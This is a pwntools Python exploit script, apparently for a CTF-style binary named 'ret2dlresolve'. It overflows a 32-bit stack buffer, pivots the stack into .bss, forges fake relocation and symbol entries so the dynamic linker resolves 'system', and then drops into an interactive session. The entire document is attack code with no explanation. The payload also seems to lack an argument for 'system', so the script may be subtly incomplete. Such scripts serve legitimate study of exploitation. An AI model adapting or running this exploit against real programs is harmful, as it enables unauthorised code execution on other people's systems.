from pwn import *
context.log_level = "debug"
elf = ELF("./ret2dlresolve")
io = process("./ret2dlresolve")
pppr_addr = 0x08048619
pop_ebp_addr = 0x0804861b
leave_ret_addr = 0x08048458

write_plt = elf.plt['write'] 
write_got = elf.got['write']
read_plt = elf.plt['read']

plt_0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
bss_addr = elf.get_section_by_name('.bss').header.sh_addr + 0x500

def stack_pivot():
    payload_1 = b"A"*(0x6c+4)
    payload_1 += p32(read_plt)
    payload_1 += p32(pppr_addr)
    payload_1 += p32(0) + p32(bss_addr) + p32(100)
    payload_1 += p32(pop_ebp_addr)
    payload_1 += p32(bss_addr)
    payload_1 += p32(leave_ret_addr)
    io.send(payload_1)

def pwn():
    reloc_index = bss_addr + 28 -rel_plt
    r_sym = (bss_addr + 40 - dynsym) / 0x10
    r_type = 0x7
    r_info = (int(r_sym) << 8) + (r_type & 0xff)
    fake_reloc = p32(write_got) + p32(r_info)
    st_name = bss_addr + 56 - dynstr
    st_bind = 0x1
    st_type = 0x2
    st_info = (st_bind << 4) + (st_type & 0xf)
    fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)
    payload = b"AAAAAAAA"
    payload += p32(plt_0)
    payload += p32(reloc_index)
    payload += b"AAAA"
    payload += fake_reloc
    payload += b"AAAA"
    payload += fake_sym 
    payload += b"system\x00"
    payload += b"A" * (100-len(payload))
    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    stack_pivot()
    pwn()



